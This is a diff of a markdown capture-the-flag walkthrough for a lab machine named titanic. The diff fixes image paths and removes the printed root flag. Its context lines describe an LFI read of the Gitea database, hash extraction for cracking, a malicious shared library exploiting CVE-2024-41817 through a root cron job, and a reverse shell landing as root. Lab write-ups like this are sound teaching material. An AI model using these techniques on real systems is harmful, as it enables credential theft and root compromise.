@@ -37,7 +37,7 @@ PORT   STATE SERVICE
 80/tcp open  http
 ```
 
-![Nmap scan of the target](images/titanic/01-nmap.png)
+![Nmap scan of the target](../images/titanic-01-nmap.png)
 
 Port 80 redirects to the `titanic.htb` vHost, added to `/etc/hosts`.
 
@@ -97,7 +97,7 @@ The same `ticket` LFI is reachable straight from Burp Repeater, confirming the p
 the raw SQLite content coming back in the response (docker-compose leak on the left, the file-read
 against `gitea.db` on the right):
 
-![Burp Repeater: LFI leaking the docker-compose config and the Gitea SQLite DB](images/titanic/02-burp-lfi-gitea-db.png)
+![Burp Repeater: LFI leaking the docker-compose config and the Gitea SQLite DB](../images/titanic-02-burp-lfi-gitea-db.png)
 
 ### Dumping credentials
 
@@ -121,7 +121,7 @@ echo "e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef3
 sha256:50000:<salt_b64>:<hash_b64>
 ```
 
-![sqlite3 dump of the user table and base64-encoding the salt/hash for Hashcat](images/titanic/03-sqlite-dump-hashes.png)
+![sqlite3 dump of the user table and base64-encoding the salt/hash for Hashcat](../images/titanic-03-sqlite-dump-hashes.png)
 
 ### Cracking the hash
 
@@ -151,7 +151,7 @@ develop+  1103  ... /usr/bin/python3 /opt/app/app.py
 develop+  1734  ... /usr/local/bin/gitea web
 ```
 
-![SSH as developer, ps aux showing the running app.py and gitea services](images/titanic/04-ssh-ps-aux.png)
+![SSH as developer, ps aux showing the running app.py and gitea services](../images/titanic-04-ssh-ps-aux.png)
 
 Enumerating `/opt` reveals `/opt/app` (group-owned by `developer`) and `/opt/scripts`, which
 holds `identify_images.sh` — a script, scheduled every minute, that runs:
@@ -188,7 +188,7 @@ __attribute__((constructor)) void init(){
 EOF
 ```
 
-![Building the malicious libxcb.so.1 that triggers CVE-2024-41817](images/titanic/05-imagemagick-cve-exploit.png)
+![Building the malicious libxcb.so.1 that triggers CVE-2024-41817](../images/titanic-05-imagemagick-cve-exploit.png)
 
 The `constructor` attribute makes `init()` run as soon as the shared library is loaded — i.e. the
 moment root's scheduled `magick identify` call picks it up.
@@ -206,9 +206,8 @@ connects back:
 connect to [10.10.15.0] from (UNKNOWN) [10.10.11.55] 52698
 root@titanic:/opt/app/static/assets/images# cd /root
 root@titanic:~# cat root.txt
-590cd50b51d4f57643c4d0d7f2c58a81
 ```
 
-![Reverse shell landing as root and reading root.txt](images/titanic/06-root-shell.png)
+![Reverse shell landing as root and reading root.txt](../images/titanic-06-root-shell.png)
 
-**Root flag:** `590cd50b51d4f57643c4d0d7f2c58a81`
+The flag was located at `/root/root.txt`.
